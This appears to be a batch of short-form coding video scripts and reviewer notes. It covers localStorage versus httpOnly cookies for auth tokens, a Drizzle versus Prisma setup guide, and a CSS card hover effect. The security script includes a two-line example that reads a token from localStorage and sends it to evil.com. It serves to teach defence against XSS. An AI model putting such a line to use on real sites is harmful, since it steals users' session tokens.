hook: Is storing your *login token* in localStorage safe?

points.title: Feels secure
points.body: Just your own code touching it

visual.title: auth.ts

points.title: Any script reads it
points.body: One xss bug leaks everything

visual.title: exploit.js
visual.code:
const t = localStorage.getItem('tok');
fetch('https://evil.com', {body: t});

points.title: Use httpOnly cookies
points.body: JavaScript cannot read those cookies

visual.title: server.js

dm_guide: Skip localStorage for auth tokens, any XSS bug can read it instantly. Use an httpOnly cookie instead. Server side, set it like this: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/. That header blocks JavaScript from ever touching the cookie. Pair it with a short expiry and refresh token rotation, and keep SameSite set to Strict or Lax to help with CSRF too. Docs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies and https://owasp.org/www-community/HttpOnly
caption:
localStorage vs httpOnly cookies for auth tokens
One XSS bug can leak everything sitting in localStorage
Where do you store your tokens? 👇
voiceover: [urgent] Quick question, is your login token sitting in localStorage?
[knowing] It looks harmless since nothing else seems to touch it.
[serious, fast] But one xss bug lets any script read it.
[confident and fast] Httponly cookies fix that, javascript simply cannot touch them.

dm_guide: Here's the quick decision guide. Drizzle: install drizzle-orm and your db driver, define tables with pgTable in plain TypeScript, run npx drizzle-kit push to sync, query with db.select().from(table). No generate step, no engine binary, great for serverless and edge. Docs: orm.drizzle.team. Prisma: install prisma and @prisma/client, define models in schema.prisma, run npx prisma generate then npx prisma migrate dev, query with prisma.model.findMany. Ships a query engine binary plus Prisma Studio. Docs: www.prisma.io/docs. Pick Drizzle for lightweight edge deploys, Prisma for built-in tooling and a GUI.

caption:
CSS card hover lift effect with box-shadow and border-radius
Screenshot-ready code in three small steps.
What UI piece should I build next? 👇
voiceover: [intrigued, fast] What actually makes a flat card lift and float?
[knowing] Right now it's just a plain, unstyled div.
[confident] Add padding, radius and a soft shadow next.
[excited] Then one hover rule lifts it right off the page.
[warm, inviting] Comment card and I'll send the full CSS file.

first_frame.problem: Frame 0 is text-only (headline plus a caption badge) with no code or screenshot proof of the hook on screen, violating the 'no text-only first frame' rule.

payoff.problem: The full CSS is shown and readable, but the actual rendered card (the shadow and the hover lift) is never shown on screen — only code, no live preview of the transformation the hook promises.
